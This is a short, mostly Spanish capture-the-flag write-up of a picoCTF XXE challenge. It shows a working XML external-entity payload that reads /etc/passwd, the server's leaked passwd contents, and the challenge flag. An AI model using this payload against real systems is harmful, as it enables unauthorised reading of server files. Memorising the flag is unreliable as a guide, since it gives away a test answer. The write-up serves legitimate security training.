## Objetivo
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## Solución
Interceptamos la solicitud con BurpSuift y notamos que está mandando por post un XML, lo modificamos para que quede así:
```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data><ID>&file;</ID></data>
```

Y finalmente nos regresa esto:

```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Tue, 01 Oct 2024 20:20:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
```

el cual tiene la flag:
picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}


## Notas Adicionales


## Referencias
